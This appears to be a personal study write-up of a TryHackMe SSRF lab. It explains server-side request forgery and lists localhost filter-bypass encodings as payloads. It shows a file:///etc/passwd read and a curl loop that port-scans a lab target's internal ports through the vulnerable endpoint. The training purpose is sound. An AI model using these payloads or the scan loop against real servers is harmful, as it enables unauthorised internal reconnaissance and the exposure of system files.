# TryHackMe: Web Fundamentals

## SSRF

### What is SSRF?

SSRF = Server-side request forgery

Basically, this is a vulnerability in an externally-facing server (typically a web server) that allows the attacker (that's me!) to query additional servers "behind" the vulnerable server that they wouldn't normally be able to see.

### Cause of the Vulnerability

SSRF can also involve using the a vulnerable server as a relay to attack other servers on the internet.

Typically an SSRF attack requires that the application be passed a URL by the attacker and then acts on that URL without sufficient validation.

### SSRF Payload

Example SSRF test: Will the application allow you to open a connection to an arbitrary port, such as a local MySQL server? For example, does https://127.0.0.1:3306 return a response?

Other options:

* `localhost`
* `[::]` or `::` (IPv6 localhost)
* `2130706433` (localhost in decimal)
* `0x7f000001` (loclahost in hexadecimal)
* `file://` (sometimes works for local file inclusion)

Note that different frameworks will, of course, munge inputs differently, and various filters may be in place. There's no guaranteed path!

Decimal/Hexidecimal conversion for IPv4 addresses is relatively simple if you remember that we break IPv4 addresses up into 4 *octets*, where each octet is 8 binary digits. Thus

$$\begin{flalign}
127.0.0.1 & = (127 \times 2^{24}) + (0 \times 2^{16}) + (0 \times 2^8) + (1 \times 2^0) &\\
          & = 2130706432 + 0 + 0 + 1 &\\
		& = 2130706433
\end{flalign}$$

Converting to hexadecimal is trivial using the excellent [Qalculate!](https://qalculate.github.io/) tool.

```qalc
2130706433 to hex = 0x7F000001
```

As usual, [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery) is a great resource.

### Exercise

The target accepts `0x7f000001` as a valid (and unfiltered) representation for localhost, so we're going to use this and the [ZAP Fuzzer](../notes/owasp-zap.md) (which is annoyingly slow, but the free version of the [Intruder](../notes/burp-suite.md) is even slower...) to enumerate all of the ports from 1 - 65535. Successful vs. unsuccessful requests are pretty obvious in from their differing response body sizes (successful requests have a body size of 1041 bytes, or in one case 1035 bytes, while unsuccessful requests have a body size of 1045 bytes).

The target is also vulnerable to local file inclusion, so `file:///etc/passwd` will get us a full user list.

### Solution

TryHackMe uses a small shell script with a tight cURL loop instead of [ZAP](../notes/owasp-zap.md). Which would probably have been faster, but I didn't feel like hunting through the cURL man page to figure out what flags I needed.

```bash
for PORT in {1..65535}; do
	BODY_LENGTH="$(curl -so /dev/null http://10.10.229.43:8000/attack?url=http://0x7f000001:$PORT -w '%{size_download}')"
	if [[ $BODY_LENGTH != 1045 ]]; then
		echo "Open port: $PORT"
	fi
done
```

- - - -

<span aria-hidden="true">👤</span> Nathan Acks  
<span aria-hidden="true">📅</span> January 24, 2022
